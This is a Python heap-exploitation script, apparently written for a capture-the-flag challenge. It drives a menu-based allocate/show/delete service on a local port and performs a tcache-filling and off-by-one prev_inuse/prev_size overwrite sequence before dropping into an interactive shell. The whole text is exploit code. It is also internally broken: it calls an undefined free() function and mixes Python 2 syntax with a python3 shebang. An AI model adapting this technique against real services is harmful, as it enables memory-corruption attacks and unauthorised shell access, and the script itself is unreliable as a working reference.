#!/usr/bin/python3
import socket, struct, telnetlib


def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)


def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
      data += f.read(1)
    return data


def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()


def p(a): return struct.pack("<I",a)
def u(a): return struct.unpack("<I",a)[0]
def p64(a): return struct.pack("<Q",a)
def u64(a): return struct.unpack("<Q",a)[0]


def new(data, size):
    read_until(f, 'Your choice: ')
    f.write('1\n')

    read_until(f, 'Size:')
    f.write(str(size) + '\n')

    read_until(f, 'Data:')
    f.write(data)


def show(index):
    read_until(f, 'Your choice: ')
    f.write('2\n')

    read_until(f, 'Index:')
    f.write('{}\n'.format(index))

    data = read_until(f, '$').rstrip('$\n')
    return data


def delete(index):
    read_until(f, 'Your choice: ')
    f.write('3\n')

    read_until(f, 'Index:')
    f.write('{}\n'.format(index))



s, f = sock("127.0.0.1", 4088)
# s, f = sock("192.168.33.10", 4088)

print 'wait...'
raw_input()
print 'continue'

buf = 'AAAAAAA' # 0
new(buf, 0xf8)

buf = 'BBBBBBBB' # 1
new(buf, 0x18)

buf = 'CCCCCCCC' # 2
new(buf, 0xf8)


# fill up tcacahe
for i in xrange(7):
    new(p64(i), 8)

for i in xrange(3, 3+7):
    delete(i)

# this chunk will be treated as smallbins
free(0)


free(1)
# overwrite prev in use of 2
buf = 'D' * 0x18
new(buf, 0x18)

# change prev size of 2 to 0x120
for i in xrange(0x17, 0x12, -1):
    buf = 'E' * i
    new(buf, i)
buf = 'F' * 0x10 + '\x20\x01'
new(buf, len(buf))


shell(s)
